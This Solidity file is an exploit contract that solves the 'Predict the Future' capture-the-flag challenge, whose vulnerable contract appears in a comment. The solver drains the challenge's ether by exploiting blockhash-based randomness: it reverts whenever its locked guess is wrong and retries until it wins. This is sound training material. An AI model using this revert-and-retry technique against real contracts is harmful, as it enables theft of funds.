/*Use the Atomicity of the transaction to settle. Lock the number then require the completion in the sole function, so the txn revert every time you are wrong.*/


//SPDX-License-Identifier: No-License
pragma solidity ^0.8.0;
/*
contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}*/

//Deployed Address:
//0x6A138fb4aD16c6445d815Fb1C30B57DF0868048c
interface IPredictTheFuture{
    function isComplete() external view returns(bool);
    function lockInGuess(uint8 n) external payable;
    function settle() external;

}
contract PredictTheFutureSolver{
    IPredictTheFuture public deployedContract;
    address payable public owner;

    constructor(address _deployedContractAddress){
        owner = payable(msg.sender);
        deployedContract = IPredictTheFuture(_deployedContractAddress);
    }

    modifier onlyOwner(){
        require(msg.sender == owner, "Only Owner can do that");
        _;
    }
    function withdraw() public payable onlyOwner {
        owner.transfer(address(this).balance);
    }
    function lockGuess(uint8 _n) external payable{//need to lock the guess and wait for at least one block to be minted
        require(_n >= 0 && _n <= 9, "Guess need to be between 0 and 9");
        deployedContract.lockInGuess{value: 1 ether}(_n);
    }
    function solve() external payable{
        deployedContract.settle();
        require(deployedContract.isComplete(), "Incorrect guess");
        payable(tx.origin).transfer(address(this).balance);
    }
    receive() external payable{

    }
}
